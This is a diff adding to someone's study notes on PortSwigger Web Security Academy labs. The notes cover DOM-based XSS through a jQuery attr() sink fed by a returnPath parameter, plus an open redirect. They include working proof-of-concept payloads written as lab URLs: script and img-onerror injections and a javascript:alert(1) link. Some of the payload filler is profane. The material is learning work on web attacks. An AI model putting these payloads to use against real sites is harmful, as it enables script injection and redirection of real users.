@@ -418,7 +418,45 @@ After that we can do dom based XSS attack
 https://0a4200c003e746a68219ddee0048006b.web-security-academy.net/product?productId=1&storeId=<script>alert(1)</script>
 
 https://0ad7000d033174a3826883e4000300b4.web-security-academy.net/product?productId=1&storeId=fuck<select><img src=fuckyou onerror=alert(1)>
+_______________________________________________________________________________________________________________________________________________________________________________________________
+Dom based XSS in submit feedback(it happens in backlink)
+---------------------------------
+https://0a67001b03d231a780716cda00a80042.web-security-academy.net/feedback?returnPath=test
 
- 
+
+<a id="backLink" href="test">Back</a>
+
+<script>
+
+  $(function() {
+     $('#backLink').attr("href", (new URLSearchParams(window.location.search)).get('returnPath'));
+  });
+                        
+</script>
+
+
+location.search > it means it retrieves everything behind the ?
+
+
+When we type anything as a value of returnPath parameter > it pass to attr() > attr() manipulates href attribute.
+
+When we click back link, it directs to google.com (open-redirect vulnerability)
+--------------------------------------------------------------------------------
+
+https://0a67001b03d231a780716cda00a80042.web-security-academy.net/feedback?returnPath=https://www.google.com
+
+
+You can also do dom based XSS
+-------------------------------
+
+https://0a67001b03d231a780716cda00a80042.web-security-academy.net/feedback?returnPath=javascript:alert(1);
+
+
+
+
+
+
+
+
 
 
